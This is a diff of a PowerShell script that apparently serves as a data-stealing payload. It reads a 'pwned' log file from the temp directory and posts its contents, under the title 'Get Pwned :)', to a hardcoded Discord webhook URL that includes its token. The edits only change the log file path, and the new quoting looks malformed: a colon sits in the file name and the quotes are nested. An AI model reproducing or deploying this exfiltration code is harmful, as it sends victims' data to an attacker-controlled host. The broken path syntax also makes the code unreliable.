@@ -1,5 +1,5 @@
 
- $generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
+ $generateLog = New-Item -Path "$env:temp/"pwned:).log"" -ItemType File -Force
 
  function Webhook($webhook = 'https://discord.com/api/webhooks/945312004728582165/y4E63O32Qxa-2pwakeuGXaI7KhchlUjrcsM7iD55HcZcUn65hGn-QhLlcvWFKgDb6O10'){
 
@@ -8,7 +8,7 @@
     
     #Store embed values
     $title       = 'Get Pwned :)'
-    $description = [IO.File]::ReadAllText("$env:tmp\pwned.log")
+    $description = [IO.File]::ReadAllText("$env:tmp/"pwned:).log"")
      $color       = '1'
     
     #Create thumbnail object
@@ -42,7 +42,7 @@
     #Send over payload, converting it to JSON
     Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose
 
-      $generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
+      $generateLog = New-Item -Path $env:temp/"pwned:).log" -ItemType File -Force
      }
 
 
